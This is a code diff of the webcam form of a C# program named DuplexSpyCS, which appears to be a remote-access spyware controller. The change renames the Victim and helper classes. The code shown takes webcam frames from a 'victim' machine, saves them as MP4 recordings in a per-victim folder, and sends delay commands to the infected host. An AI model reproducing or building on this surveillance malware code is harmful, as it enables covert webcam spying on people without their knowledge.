@@ -15,7 +15,7 @@ namespace DuplexSpyCS
 {
     public partial class frmWebcam : Form
     {
-        public Victim v;
+        public clsVictim v;
         private bool capture = false;
 
         //FPS
@@ -48,7 +48,7 @@ namespace DuplexSpyCS
             try
             {
                 bool record = false;
-                Image image = C1.Base64ToImage(b64_img);
+                Image image = clsTools.Base64ToImage(b64_img);
                 v.img_LastWebcam = image;
                 Invoke(new Action(() =>
                 {
@@ -70,7 +70,7 @@ namespace DuplexSpyCS
                         {
                             v.dir_victim,
                             "Webcam",
-                            C1.GenerateFileName("mp4"),
+                            clsTools.GenerateFileName("mp4"),
                         });
 
                         videoWriter = new VideoWriter(mp4_file, FourCC.MP4V, 10, new OpenCvSharp.Size(imgWidth, imgHeight));
@@ -347,7 +347,7 @@ namespace DuplexSpyCS
 
         private void toolStripButton8_CheckStateChanged(object sender, EventArgs e)
         {
-            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
+            if (isProcessing && clsTools.IsPositiveNumber(toolStripComboBox2.Text))
             {
                 v.SendCommand($"webcam|delay|{toolStripComboBox2.Text}");
             }
@@ -355,7 +355,7 @@ namespace DuplexSpyCS
 
         private void toolStripComboBox2_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (isProcessing && C1.IsPositiveNumber(toolStripComboBox2.Text))
+            if (isProcessing && clsTools.IsPositiveNumber(toolStripComboBox2.Text))
             {
                 v.SendCommand($"webcam|delay|{toolStripComboBox2.Text}");
             }
